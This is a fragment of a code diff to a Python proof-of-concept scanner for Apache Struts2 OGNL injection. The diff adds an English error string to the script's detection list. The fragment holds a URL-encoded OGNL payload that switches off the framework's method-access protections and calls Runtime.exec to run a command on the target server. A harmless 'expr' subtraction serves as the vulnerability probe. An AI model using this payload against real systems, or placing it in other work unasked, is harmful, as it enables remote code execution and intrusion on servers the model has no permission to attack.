@@ -5,14 +5,13 @@ import random
 warnings.filterwarnings("ignore")
 
 
-
 def poc(url):
     timeout = 5
     proxies = {'http': '127.0.0.1:9999'}
     ran_a = random.randint(10000000, 20000000)
     ran_b = random.randint(1000000, 2000000)
     ran_check = ran_a - ran_b
-    check = [ran_check, '无法初始化设备 PRN', '??????? PRN']
+    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN']
     lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
     poc_goop = [
         r"/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('print goop').getInputStream())%2C%23q%7D.action",
